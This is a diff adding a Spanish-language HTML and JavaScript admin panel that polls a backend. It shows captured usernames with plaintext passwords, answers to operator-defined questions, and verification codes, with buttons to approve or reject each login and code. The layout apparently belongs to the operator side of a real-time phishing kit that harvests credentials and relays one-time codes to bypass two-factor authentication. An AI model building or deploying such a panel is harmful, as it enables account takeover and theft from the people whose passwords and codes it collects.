@@ -1,0 +1,154 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>Panel de Administración</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    input, button { margin: 5px 0; padding: 8px; }
+    ul { list-style: none; padding-left: 0; }
+    li { margin-bottom: 10px; }
+    button { margin-left: 5px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h1>Solicitudes de Login</h1>
+  <ul id="listaSolicitantes"></ul>
+
+  <h1>Preguntas Dinámicas</h1>
+  <input type="text" id="nuevaPregunta" placeholder="Nueva pregunta" />
+  <button onclick="crearPregunta()">Agregar pregunta</button>
+  <ul id="listaPreguntas"></ul>
+
+  <h1>Respuestas Recibidas</h1>
+  <ul id="listaRespuestas"></ul>
+
+  <h1>Códigos de Verificación</h1>
+  <ul id="listaCodigos"></ul>
+
+<script>
+const API_URL = 'http://localhost:3000'; // Cambia por la URL de tu backend
+
+// Solicitudes Login
+async function cargarSolicitantes() {
+  const res = await fetch(`${API_URL}/solicitantes`);
+  const solicitantes = await res.json();
+  const lista = document.getElementById('listaSolicitantes');
+  lista.innerHTML = '';
+  solicitantes.forEach(s => {
+    const li = document.createElement('li');
+    li.textContent = `Usuario: ${s.usuario} - Contraseña: ${s.clave} - Estado: ${s.estado} - Fecha: ${new Date(s.fecha).toLocaleString()}`;
+
+    if (s.estado === 'pendiente') {
+      const btnAprobar = document.createElement('button');
+      btnAprobar.textContent = 'Aprobar';
+      btnAprobar.onclick = () => cambiarEstadoSolicitante(s.id, 'aprobado');
+
+      const btnRechazar = document.createElement('button');
+      btnRechazar.textContent = 'Rechazar';
+      btnRechazar.onclick = () => cambiarEstadoSolicitante(s.id, 'rechazado');
+
+      li.appendChild(btnAprobar);
+      li.appendChild(btnRechazar);
+    }
+    lista.appendChild(li);
+  });
+}
+async function cambiarEstadoSolicitante(id, estado) {
+  await fetch(`${API_URL}/solicitantes/${id}`, {
+    method: 'PUT', headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ estado })
+  });
+  cargarSolicitantes();
+}
+
+// Preguntas
+async function cargarPreguntas() {
+  const res = await fetch(`${API_URL}/preguntas`);
+  const preguntas = await res.json();
+  const lista = document.getElementById('listaPreguntas');
+  lista.innerHTML = '';
+  preguntas.forEach(p => {
+    const li = document.createElement('li');
+    li.textContent = p.texto + ' ';
+    const btnBorrar = document.createElement('button');
+    btnBorrar.textContent = 'Borrar';
+    btnBorrar.onclick = () => borrarPregunta(p.id);
+    li.appendChild(btnBorrar);
+    lista.appendChild(li);
+  });
+}
+async function crearPregunta() {
+  const texto = document.getElementById('nuevaPregunta').value.trim();
+  if (!texto) return alert('Escribe una pregunta');
+  await fetch(`${API_URL}/preguntas`, {
+    method: 'POST', headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ texto })
+  });
+  document.getElementById('nuevaPregunta').value = '';
+  cargarPreguntas();
+}
+async function borrarPregunta(id) {
+  await fetch(`${API_URL}/preguntas/${id}`, { method: 'DELETE' });
+  cargarPreguntas();
+}
+
+// Respuestas
+async function cargarRespuestas() {
+  const res = await fetch(`${API_URL}/respuestas`);
+  const respuestas = await res.json();
+  const lista = document.getElementById('listaRespuestas');
+  lista.innerHTML = '';
+  respuestas.forEach(r => {
+    const li = document.createElement('li');
+    li.textContent = `Usuario: ${r.usuario} - Respuestas: ${JSON.stringify(r.respuestasUsuario)} - Fecha: ${new Date(r.fecha).toLocaleString()}`;
+    lista.appendChild(li);
+  });
+}
+
+// Códigos de Verificación
+async function cargarCodigos() {
+  const res = await fetch(`${API_URL}/codigos`);
+  const codigos = await res.json();
+  const lista = document.getElementById('listaCodigos');
+  lista.innerHTML = '';
+  codigos.forEach(c => {
+    const li = document.createElement('li');
+    li.textContent = `Usuario: ${c.usuario} - Código: ${c.codigo} - Estado: ${c.estado} - Fecha: ${new Date(c.fecha).toLocaleString()}`;
+    if (c.estado === 'pendiente') {
+      const btnAprobar = document.createElement('button');
+      btnAprobar.textContent = 'Aprobar';
+      btnAprobar.onclick = () => cambiarEstadoCodigo(c.id, 'aprobado');
+      const btnRechazar = document.createElement('button');
+      btnRechazar.textContent = 'Rechazar';
+      btnRechazar.onclick = () => cambiarEstadoCodigo(c.id, 'rechazado');
+      li.appendChild(btnAprobar);
+      li.appendChild(btnRechazar);
+    }
+    lista.appendChild(li);
+  });
+}
+async function cambiarEstadoCodigo(id, estado) {
+  await fetch(`${API_URL}/codigos/${id}`, {
+    method: 'PUT', headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ estado })
+  });
+  cargarCodigos();
+}
+
+// Inicializar carga y refresco
+cargarSolicitantes();
+cargarPreguntas();
+cargarRespuestas();
+cargarCodigos();
+
+setInterval(() => {
+  cargarSolicitantes();
+  cargarPreguntas();
+  cargarRespuestas();
+  cargarCodigos();
+}, 10000);
+
+</script>
+</body>
+</html>
